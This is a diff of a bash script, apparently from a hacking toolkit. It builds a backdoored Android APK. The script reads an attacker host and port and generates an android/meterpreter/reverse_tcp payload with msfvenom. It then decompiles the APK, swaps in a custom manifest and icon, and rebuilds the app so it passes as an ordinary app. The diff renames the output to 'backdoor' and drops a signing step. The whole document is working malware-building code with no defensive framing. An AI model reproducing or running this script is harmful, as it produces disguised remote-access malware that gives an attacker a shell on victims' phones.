@@ -14,30 +14,29 @@ echo -e "\e[33m                      [Coded By  :- @kinghacker0]                
 echo -e "\e[33m                  [Github ID :- github.com/kinghacker0                               \e[0m"
 
 echo -e "\e[55m                                 \e[1m"
-read -p "[-]Enter Name Of Output Payload#~ :" payload
+read -p "[-]Enter Name Of Output Payload#~ :" backdoor
 read -p "[-]Enter lhost#~ :" lhost
 read -p "[-]Enter lport#~ :" lport
 echo -e "\e[55m                                 \e[1m"
-msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> payload.apk
+msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> backdoor.apk
 #decompile
-apktool d payload.apk
-cd payload/res && mkdir drawable
+apktool d backdoor.apk
+cd backdoor/res && mkdir drawable
 cd .. && rm AndroidManifest.xml
-cd .. && cp AndroidManifest.xml payload
-cp icon.png payload/res/drawable
-#recompile
-apktool b payload
-cd payload && cd dist
-mv payload.apk ..
-cd .. && mv payload.apk ..
-cd .. && rm -rf payload
-echo -r "[-]Successfully Payload Generated!";
-echo -e "\e[60m                                                              \e[0m"
+cd .. && cp AndroidManifest.xml backdoor
+cp icon.png backdoor/res/drawable
+
+#Recompiling
+apktool b backdoor
+cd backdoor && cd dist
+mv backdoor.apk ..
+cd .. && mv backdoor.apk ..
+cd .. && rm -rf backdoor
+
 #Signing the apk
 echo -e "\e[96m                                 \e[2m"
-echo "[-] Signing the final apk "
-echo "  "
-zipalign -v 4 payload.apk payload-signed.apk
-rm payload.apk && mv payload-signed.apk $payload.apk
 
-#Change this banner doesn't make you programmer
+mv backdoor.apk $backdoor.apk
+
+echo
+echo -e $Y"I Recommend You To Sign It With Apk-Editor Apk"
